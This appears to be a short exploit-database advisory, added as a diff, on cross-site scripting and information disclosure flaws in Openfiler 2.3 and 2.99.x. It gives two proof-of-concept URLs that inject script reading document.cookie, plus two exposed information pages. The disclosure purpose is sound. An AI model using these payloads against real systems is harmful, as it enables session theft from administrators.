@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/55500/info
+
+Openfiler is prone to multiple cross-site scripting and information disclosure vulnerabilities.
+
+An attacker may leverage these issues to obtain potentially sensitive information and to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Openfiler versions 2.3, 2.99.1 and 2.99.2 are vulnerable; other versions may also be affected. 
+
+https://www.example.com/admin/system.html?step=2&device="><script>alert(document.cookie);</script><p+"
+
+https://www.example.com/admin/volumes_iscsi_targets.html?targetName="><script>alert(document.cookie);</script><p+"
+
+https://www.example.com/phpinfo.html
+
+https://www.example.com/uptime.html 
